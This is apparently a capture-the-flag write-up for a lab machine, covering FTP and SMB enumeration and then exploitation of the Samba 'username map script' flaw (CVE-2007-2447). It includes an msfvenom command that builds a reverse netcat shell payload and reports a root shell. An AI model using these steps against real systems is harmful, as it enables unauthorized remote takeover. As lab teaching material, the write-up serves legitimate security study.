We have anonymous access to `FTP` but can't put files inside it, also there are no files inside it

Using `smbmap` to enumerate shares we have `READ, WRITE` permissions on only one share (**tmp**)

Connecting to the share with `smbclient` we have

We can go ahead and download all of this files

Only 2 where permitted for us to download

Nothing still seems interesting in this files

Checking the smb version, i found out it is vulnerable to **Username' map script' Command Execution** (CVE-2007-2447), we can go ahead and download the exploit from [here](https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851)

- Make sure `pysmb` is installed

```bash
sudo pip2 install pysmb
```

- Then run this command replacing `LHOST` with your `tun0` IP address and copy the shellcode

```bash
msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.90 LPORT=1337 -f python
```

- Replace it with the default shellcode in the script


![](https://i.imgur.com/53U01Ng.png)

Run the script with `python2` and get a reverse shell

Hell yeah, we got reverse shell as user **root**
